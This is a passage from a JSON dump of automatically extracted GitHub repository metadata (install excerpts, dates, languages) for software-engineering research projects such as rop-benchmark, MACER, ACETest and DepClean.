            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "    $ sudo apt install build-essential nasm gcc-multilib\n    $ sudo snap install docker\n",
                    "type": "Text_excerpt",
                    "original_header": "Ubuntu 18.04",
                    "parent_header": [
                        "Installation",
                        "Prerequisites"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    $ sudo ./bash.sh\n \n",
                    "original_header": "Bash to Docker"
                },
                "confidence": 0.9973889305585478,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    $ ./run.sh -s \n",
                    "original_header": "Synthetic test suite"
                },
                "confidence": 0.9578381369739282,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Real life binaries are placed in `binaries/x86/reallife/orig`. It contains several\nset of binaries from different Linux distributions: \nIt is just almost all ELF files (both binaries and shared libraries) of default\ninstallation. \n    $ ./run.sh -r openbsd-62 \n",
                    "original_header": "Real life binaries test suite"
                },
                "confidence": 0.9763673614607508,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    $ ./run.sh -t ropper\n \n",
                    "original_header": "Supported tools"
                },
                "confidence": 0.9578381369739282,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    === Tool 'angrop' === Exp. type 'execve'\n    1:rop-benchmark:angrop:binaries/x86/reallife/vuln/centos-7.1810/ld.bfd.bin - INFO - OK\n    2:rop-benchmark:angrop:binaries/x86/reallife/vuln/centos-7.1810/ld.gold.bin - CRITICAL - FAIL TIMEOUT\n    3:rop-benchmark:angrop:binaries/x86/reallife/vuln/centos-7.1810/libBrokenLocale-2.17.so.bin - ERROR - Compilation ERROR with 1 (angrop)\n    4:rop-benchmark:angrop:binaries/x86/reallife/vuln/centos-7.1810/libasound.so.2.0.0.bin - CRITICAL - FAIL HIJACK\n    --- Test suite --- binaries/x86/reallife/vuln/centos-7.1810 : 53 / 649 (passed/all) \n1. `ERROR` - tool didn't generate a ROP chain.\n2. `FAIL TIMEOUT` (TL) -  tool exceeds the time limit (300 s as default).\n3. `FAIL HIJACK` (F) - tool generated a ROP chain but it didn't run `/bin/sh`.\n4. `OK` - tool generated a ROP chain and it ran `/bin/sh`.\n \n",
                    "original_header": "Benchmark results"
                },
                "confidence": 0.9937090218454763,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "At least one OK means at least one tool produced OK. \n",
                    "original_header": "Evaluation"
                },
                "confidence": 0.9582441462322191,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ispras/rop-benchmark/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-14T11:00:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T19:13:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 40714
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 4641
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 4470
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2921
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 2835
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "802": {
        "filename": "jonayerdi_marmot_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jonayerdi/marmot",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* SelfOracle\n    * [https://github.com/testingautomated-usi/selforacle](https://github.com/testingautomated-usi/selforacle) (MIT License)\n* LeoRover\n    * [https://github.com/LeoRover/leo_examples/tree/master/leo_example_line_follower](https://github.com/LeoRover/leo_examples/tree/master/leo_example_line_follower) (MIT License)\n* Anomalies\n    * [https://github.com/tsigalko18/transferability-testing-sdcs/blob/main/visualodometry/corruptions/hendrycks.py](https://github.com/tsigalko18/transferability-testing-sdcs/blob/main/visualodometry/corruptions/hendrycks.py) (MIT License)\n    * [https://github.com/hendrycks/robustness/blob/master/ImageNet-C/create_c/make_cifar_c.py](https://github.com/hendrycks/robustness/blob/master/ImageNet-C/create_c/make_cifar_c.py) (Apache License 2.0)\n \n",
                    "original_header": "MarMot: Metamorphic Runtime Monitoring of Autonomous Driving Systems"
                },
                "confidence": 0.9800622075456404,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jonayerdi/marmot/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-10T14:45:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-10T14:49:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 292398
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 139051
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "803": {
        "filename": "ExpertiseModel_MuTAP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ExpertiseModel/MuTAP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Test cases generated by both initial prompt types, before and after augmentation are stored into two jsonl files: `Codex_test.jsonl.gz` and `llama2_test.jsonl.gz`.\n`Read_json_data.py` loads all test cases into a pickle file. \n",
                    "original_header": "Load Data"
                },
                "confidence": 0.9624775768355285,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ExpertiseModel/MuTAP/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-21T17:28:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T01:44:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8374291
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "804": {
        "filename": "99EnriqueD_verilog_autocompletion_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/99EnriqueD/verilog_autocompletion",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-06-06T21:32:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-22T10:41:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 227087
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 53430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3874
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "805": {
        "filename": "npaulinastevia_DRL_se_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/npaulinastevia/drl_se",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npip install -r requirements.txt\n```",
                    "type": "Text_excerpt",
                    "original_header": "Set up",
                    "parent_header": [
                        "A Comparison of Reinforcement Learning Frameworks for Software Testing Tasks"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/npaulinastevia/DRL_se/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-14T08:21:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-03T11:17:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 122843
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "806": {
        "filename": "SangeethNila_casestudy_ISO26262_extension_connected_driving_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SangeethNila/casestudy_ISO26262_extension_connected_driving",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-05-02T09:57:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-27T05:49:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "807": {
        "filename": "purushottamkar_macer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/purushottamkar/macer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "\r\nThis project runs on `Python 3.6`.\r\nTo install all packages, and curate the datasets from TRACER and DeepFix, install `conda` and run\r\n\r\n`sudo make install`\r\n\r\nThe MakeFile provided executes several steps. These are enumerated below for sake of clarity. If using the Makefile itself, you need not execute the following steps individually.\r\n\r\n1. Ubuntu/Debian packages\r\n    \r\n    `sudo apt install clang python3-pip unzip gzip curl sqlite3`\r\n\r\n1. Anaconda environment\r\n    \r\n    ```\r\n    conda create --name macer36 python=3.6\r\n\tconda activate macer36\r\n    ```\r\n\r\n1. Python packages\r\n    \r\n    `pip3 install --version -r requirements.txt`\r\n\r\n1. Set Clang paths\r\n\r\n    Create symbolic link (if it doesn't already exist) to enable Python-Clang bind\r\n    ```\r\n    cd /usr/lib/x86_64-linux-gnu/\r\n    sudo ln -s libclang-XX.YY.so.1 libclang.so\r\n    ```\r\n\r\n    Where, `XX.YY` is the version number of Clang installed on your system.\r\n\r\n1. Pull TRACER's dataset, which is used for training and testing of MACER\r\n\r\n    ```\r\n    git clone https://github.com/umairzahmed/tracer.git\r\n    unzip tracer/data/dataset/singleL/singleL_Test.zip -d tracer/data/dataset/singleL/\r\n    unzip tracer/data/dataset/singleL/singleL_Train+Valid.zip -d tracer/data/dataset/singleL/\r\n    ```\r\n\r\n1. Repair class creation (refer Section 2. of our paper)\r\n\r\n    `python3 -m srcT.DataStruct.ClusterError`\r\n\r\n1. Pull DeepFix dataset, used for testing MACER\r\n\r\n\t```\r\n    curl -O https://www.cse.iitk.ac.in/users/karkare/prutor/prutor-deepfix-09-12-2017.zip\r\n\tunzip prutor-deepfix-09-12-2017.zip\r\n\tgzip -d prutor-deepfix-09-12-2017/prutor-deepfix-09-12-2017.db.gz\r\n    ```\r\n\r\n1. Extract DeepFix dataset into Macer's format\r\n\r\n    ```\r\n    sqlite3 -header -csv prutor-deepfix-09-12-2017/prutor-deepfix-09-12-2017.db \"select * from Code where error<>'';\" > prutor-deepfix-09-12-2017/deepfix_test.csv\r\n    \r\n\tpython3 -m srcT.DataStruct.PrepDeepFix\r\n    ```\r",
                    "type": "Text_excerpt",
                    "original_header": "Installing Base Packages and Curate Datasets",
                    "parent_header": [
                        "MACER: A Modular Framework for Accelerated Compilation Error Repair",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/purushottamkar/macer/master/README.md"
            },
            {
                "result": {
                    "value": "\r\nThe MACER toolchain makes use of various standard libraries. A minimal list is provided in the [requirements.txt](requirements.txt) file. If you are a pip user, please use the following command to install these libraries:\r\n\r\n```setup\r\npip3 install -r requirements.txt\r\n```\r\n**Note about version dependency**: although the requirements file specifies version dependencies to be exact, this is to err on the side of caution. For most of the libraries (e.g. `pandas` or `scikit-learn`), a more recent version should work well too. However, the dependency on the 1.2.4 version of the `edlib` library seems to be strict. Having a different version of this library may cause the toolchain to malfunction at evaluation time. Similarly, for `tensorflow`, it seems that version 2.0 can cause issues with training. We advise caution while using versions of libraries different from those mentioned in the requirements file.\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Installing Python Library Dependencies",
                    "parent_header": [
                        "MACER: A Modular Framework for Accelerated Compilation Error Repair",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/purushottamkar/macer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-28T13:00:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-27T09:04:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 114443
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1244
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 204
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "808": {
        "filename": "PrivacyEngineering_hawk-benchmark_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PrivacyEngineering/hawk-benchmark",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "version: 1.18-alpha \n",
                    "original_header": "Istio"
                },
                "confidence": 0.9017794791476891,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/hawk-benchmark/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-02T15:46:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-02T19:15:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 492662
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2934
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 189
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "809": {
        "filename": "ML-Bugs-2022_Replication-Package_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ML-Bugs-2022/Replication-Package",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-04-30T22:02:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-26T09:12:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "810": {
        "filename": "MeloFancy_SIRA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/MeloFancy/SIRA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-09-06T09:33:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-20T14:32:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1093629
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1493
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "811": {
        "filename": "shijy16_ACETest_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shijy16/ACETest",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The source code of Testing part of ACETest is now available at `Tester`, you can test TensorFlow or PyTorch with the constraints extracted by ACETest with it.\n",
                    "type": "Text_excerpt",
                    "original_header": "Quick Start Guide for Tester",
                    "parent_header": [
                        "ACETest"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shijy16/ACETest/main/README.md"
            },
            {
                "result": {
                    "value": "The constraints were extracted from the source code of TensorFlow 2.9.0 and PyTorch 1.13.0, so it is better to install tensorflow==2.9.0 and pytorch==1.13.0. \n\nBut it is okay to test other versions.\n",
                    "type": "Text_excerpt",
                    "original_header": "Supported AI Frameworks",
                    "parent_header": [
                        "ACETest",
                        "Quick Start Guide for Tester",
                        "Prerequisites"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shijy16/ACETest/main/README.md"
            },
            {
                "result": {
                    "value": "Download the necessary constraints and auxiliary files from the following link:\n\n[Download Auxiliary Files](https://drive.google.com/file/d/1BcidVT_j_Fgwg7XyL4lK_59Xc61NlIjE/view?usp=sharing)\n\nAfter downloading, place the uncompressed files in the `Tester/data` directory to maintain the correct directory structure:\n\n```\nTester/\n\u251c\u2500\u2500 data/\n\u2502   \u251c\u2500\u2500 pytorch/\n\u2502   \u2502   \u2514\u2500\u2500 ...\n\u2502   \u2514\u2500\u2500 tensorflow/\n\u2502       \u2514\u2500\u2500 ...\n\u2514\u2500\u2500 src/\n    \u2514\u2500\u2500 ...\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Auxiliary Files",
                    "parent_header": [
                        "ACETest",
                        "Quick Start Guide for Tester",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shijy16/ACETest/main/README.md"
            },
            {
                "result": {
                    "value": "Navigate to `Tester/src` and execute the following command to test a single operator:\n\n```\npython main.py --test_round=5000 --mode=all --framework=tf --work_path=output --target_api=tf.raw_ops.BiasAdd\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Testing a Single Operator",
                    "parent_header": [
                        "ACETest",
                        "Quick Start Guide for Tester",
                        "Running Tests"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shijy16/ACETest/main/README.md"
            },
            {
                "result": {
                    "value": "To test all operators, use the `filter=all` option:\n\n```\npython main.py --test_round=5000 --mode=all --framework=tf --work_path=output --filter=all\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Testing All Operators",
                    "parent_header": [
                        "ACETest",
                        "Quick Start Guide for Tester",
                        "Running Tests"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shijy16/ACETest/main/README.md"
            },
            {
                "result": {
                    "value": "- `framework`: Specify the AI framework for testing (`tf` for TensorFlow or `torch` for PyTorch).\n- `total_round`: Set the number of test iterations for each operator.\n- `target_api`: Choose the specific operator/API to test. Available APIs can be found in the `API2OP.csv` file located under `Tester/data/*`.\n- `work_path`: Designate a directory for storing results.\n- `mode`: Select the testing mode based on the processing unit (`all`, `cpu_ori`, `cpu_onednn`, or `gpu`).\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Main Options",
                    "parent_header": [
                        "ACETest",
                        "Quick Start Guide for Tester",
                        "Running Tests"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shijy16/ACETest/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-29T07:04:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-10T12:04:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 118756
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "812": {
        "filename": "logpai_deep-loglizer_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/logpai/deep-loglizer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\ngit clone https://github.com/logpai/deep-loglizer.git\ncd deep-loglizer\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Deep-loglizer"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/logpai/deep-loglizer/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-23T23:05:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T09:10:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 59564
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2875
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "813": {
        "filename": "castor-software_depclean_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/depclean",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Prerequisites:\n\n- [Java OpenJDK 11](https://openjdk.java.net) or above\n- [Apache Maven](https://maven.apache.org/)\n\nIn a terminal clone the repository and switch to the cloned folder:\n\n```bash\ngit clone https://github.com/castor-software/depclean.git\ncd depclean\n```\nThen run the following Maven command to build the application and install the plugin locally:\n\n```bash\nmvn clean install\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing and building from source",
                    "parent_header": [
                        "DepClean <img src=\"https://github.com/castor-software/depclean/blob/master/.img/logo.svg\" align=\"left\" height=\"135px\" alt=\"DepClean logo\"/>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/castor-software/depclean/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "DepClean automatically cleans the dependency tree of Java projects.\nIt removes all the dependencies that are included in the project's dependency tree but are not actually necessary to build it. \nDepClean detects and removes all the unused dependencies declared in the `pom.xml` file of a project or imported from its parent. \nIt can be executed as a Maven goal through the command line or integrated directly into the Maven build lifecycle (CI/CD).\nDepClean does not modify the original source code of the application nor its original `pom.xml`. It has been presented in [\"A Comprehensive Study of Bloated Dependencies in the Maven Ecosystem](http://arxiv.org/pdf/2001.07808\") ([doi:10.1007/s10664-020-09914-8](https://doi.org/10.1007/s10664-020-09914-8)). \n",
                    "original_header": "What is DepClean?"
                },
                "confidence": 0.9982547867649543,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/depclean/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nYou can integrate DepClean in your CI/CD pipeline.\nFor example, if you want to fail the build in the presence of unused direct dependencies, while ignoring all the dependency scopes except the\n`compile`, use the following plugin configuration.\n```xml\n<plugin>\n  <groupId>se.kth.castor</groupId>\n  <artifactId>depclean-maven-plugin</artifactId>\n  <version>2.0.6</version>\n  <executions>\n    <execution>\n      <goals>\n        <goal>depclean</goal>\n      </goals>\n      <configuration>\n        <failIfUnusedDirect>true</failIfUnusedDirect>\n        <ignoreScopes>provided,test,runtime,system,import</ignoreScopes>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n```\nOf course, it is also possible to execute DepClean with parameters directly from the command line. The previous example can be executed directly as follows:\n```bash\nmvn se.kth.castor:depclean-maven-plugin:2.0.6:depclean -DfailIfUnusedDirect=true -DignoreScopes=provided,test,runtime,system,import\n```\n \n",
                    "original_header": "Optional Parameters"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/depclean/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. add all used transitive dependencies as direct dependencies\n2. remove all unused direct dependencies\n3. exclude all unused transitive dependencies \n",
                    "original_header": "How does DepClean works?"
                },
                "confidence": 0.9978747960215314,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/depclean/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://github.com/castor-software/depclean/blob/master/.img/wasp.svg\" height=\"50px\" alt=\"Wallenberg Autonomous Systems and Software Program (WASP)\"/>\n \n",
                    "original_header": "Funding"
                },
                "confidence": 0.9934639464983258,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/castor-software/depclean/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-11-29T10:19:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T12:39:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 302263
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Groovy",
                    "name": "Groovy",
                    "type": "Programming_language",
                    "size": 6551
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "814": {
        "filename": "beatngu13_visual-testing_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/beatngu13/visual-testing",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. 360.cn\n1. alipay.com\n1. apple.com\n1. baidu.com\n1. bbc.com\n1. blogspot.com\n1. csdn.net\n1. ebay.com\n1. facebook.com\n1. github.com\n1. google.com\n1. jd.com\n1. live.com\n1. linkedin.com\n1. soso.com\n1. stackoverflow.com\n1. twitter.com\n1. vk.com\n1. wikipedia.org\n1. youtube.com \n",
                    "original_header": "Benchmark"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/beatngu13/visual-testing/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
